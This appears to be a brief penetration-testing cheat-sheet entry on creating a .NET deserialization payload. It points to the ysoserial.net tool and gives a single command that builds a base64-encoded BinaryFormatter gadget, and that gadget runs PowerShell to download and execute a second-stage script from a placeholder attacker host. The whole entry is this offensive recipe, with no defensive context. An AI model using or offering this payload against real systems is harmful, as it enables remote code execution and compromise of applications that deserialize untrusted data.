# create deserialization object in .NET

checkout: https://github.com/pwntester/ysoserial.net

```cmd
.\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "Powershell -c IEX(new-object net.webclient).downloadstring('http://<ip>:<port>/stage1.ps1')"
```
